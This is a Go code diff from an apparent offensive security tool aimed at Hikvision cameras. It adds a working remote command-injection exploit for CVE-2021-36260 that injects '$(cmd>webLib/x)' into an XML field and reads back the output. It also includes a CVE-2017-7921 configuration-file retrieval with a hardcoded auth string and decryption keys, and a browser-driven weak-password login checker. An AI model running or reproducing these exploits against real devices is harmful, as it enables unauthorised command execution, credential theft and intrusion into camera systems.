@@ -11,6 +11,7 @@ import (
 	"regexp"
 	"slack-wails/lib/clients"
 	"strings"
+	"time"
 
 	"github.com/chromedp/chromedp"
 )
@@ -73,7 +74,7 @@ func FilterStrings(data string) []string {
 func CVE_2017_7921_Config(url string, client *http.Client) string {
 	_, body, err := clients.NewSimpleGetRequest(url+"System/configurationFile?auth=YWRtaW46MTEK", client)
 	if err != nil {
-		fmt.Printf("err: %v\n", err)
+		return err.Error()
 	}
 	key, _ := hex.DecodeString("279977f62f6cfd2d91cd75b889ce0c9a")
 	xorKey := []byte{0x73, 0x8B, 0x55, 0x44}
@@ -90,15 +91,32 @@ func CVE_2017_7921_Snapshot(url string, client *http.Client) []byte {
 	return body
 }
 
-func CVE_2021_36260(url, cmd string) {
-
+func CVE_2021_36260(url, cmd string, client *http.Client) string {
+	h := http.Header{}
+	h.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
+	body := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><language>$(%s>webLib/x)</language>`, cmd)
+	resp, _, err := clients.NewRequest("PUT", url+"SDK/webLanguage", h, strings.NewReader(body), 10, false, client)
+	if err != nil {
+		return err.Error()
+	}
+	if resp.StatusCode == 200 {
+		_, content, err := clients.NewSimpleGetRequest(url+"x", client)
+		if err != nil {
+			return err.Error()
+		}
+		return string(content)
+	}
+	return "[-] 不存在CVE-2021-36260"
 }
 
 // 弱口令检测
 func CheckLogin(url string, password []string) string {
 	var result string
+	ctx, cancel := chromedp.NewContext(context.Background())
+	defer cancel()
 	for _, pass := range password {
-		ctx, cancel := chromedp.NewContext(context.Background())
+		// 设置上下文超时
+		ctx, cancel = context.WithTimeout(ctx, time.Second*10)
 		defer cancel()
 		var res string
 		err := chromedp.Run(ctx,
